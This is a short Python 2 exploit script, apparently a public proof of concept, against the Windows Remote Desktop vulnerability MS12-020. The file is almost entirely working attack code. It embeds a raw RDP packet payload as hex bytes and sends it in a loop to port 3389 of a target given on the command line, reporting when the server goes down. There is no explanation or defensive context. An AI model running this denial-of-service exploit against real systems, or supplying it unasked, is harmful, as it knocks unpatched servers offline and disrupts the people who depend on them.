#!/usr/bin/env python
#Author: anxPsych0n00bz
#Vul: ms12-020-DoS.py
#Thank BlackBap.Org, Joshua J. Drake(jduck), payload form Chinese
import socket,sys
payload="\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00\x03\x00\x01\xd6\x02\xf0\x80\x7f\x65\x82\x01\x94\x04\x01\x01\x04\x01\x01\x01\x01\xff\x30\x19\x02\x04\x00\x00\x00\x00\x02\x04\x00\x00\x00\x02\x02\x04\x00\x00\x00\x00\x02\x04\x00\x00\x00\x01\x02\x04\x00\x00\x00\x00\x02\x04\x00\x00\x00\x01\x02\x02\xff\xff\x02\x04\x00\x00\x00\x02\x30\x19\x02\x04\x00\x00\x00\x01\x02\x04\x00\x00\x00\x01\x02\x04\x00\x00\x00\x01\x02\x04\x00\x00\x00\x01\x02\x04\x00\x00\x00\x00\x02\x04\x00\x00\x00\x01\x02\x02\x04\x20\x02\x04\x00\x00\x00\x02\x30\x1c\x02\x02\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x04\x00\x00\x00\x01\x02\x04\x00\x00\x00\x00\x02\x04\x00\x00\x00\x01\x02\x02\xff\xff\x02\x04\x00\x00\x00\x02\x04\x82\x01\x33\x00\x05\x00\x14\x7c\x00\x01\x81\x2a\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x1c\x01\xc0\xd8\x00\x04\x00\x08\x00\x80\x02\xe0\x01\x01\xca\x03\xaa\x09\x04\x00\x00\xce\x0e\x00\x00\x48\x00\x4f\x00\x53\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x10\x00\x07\x00\x01\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x2d\x00\x30\x00\x30\x00\x30\x00\x2d\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x2d\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x0d\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x1b\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x2c\x00\x03\x00\x00\x00\x72\x64\x70\x64\x72\x00\x00\x00\x00\x00\x80\x80\x63\x6c\x69\x70\x72\x64\x72\x00\x00\x00\xa0\xc0\x72\x64\x70\x73\x6e\x64\x00\x00\x00\x00\x00\xc0\x03\x00\x00\x0c\x02\xf0\x80\x04\x01\x00\x01\x00\x03\x00\x00\x08\x02\xf0\x80\x28\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x06\x03\xef\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x06\x03\xeb\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x06\x03\xec\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x06\x03\xed\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x06\x03\xee\x03\x00\x00\x0b\x06\xd0\x00\x00\x12\x34\x00"
i = 1
while(1):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(7)
		s.connect((sys.argv[1],3389))
		print "Sending: %d packets" % i
		s.send(payload)		
		rec = s.recv(50)
		s.close()
		i += 1
	except: 
		print "The Server is down"
		exit()










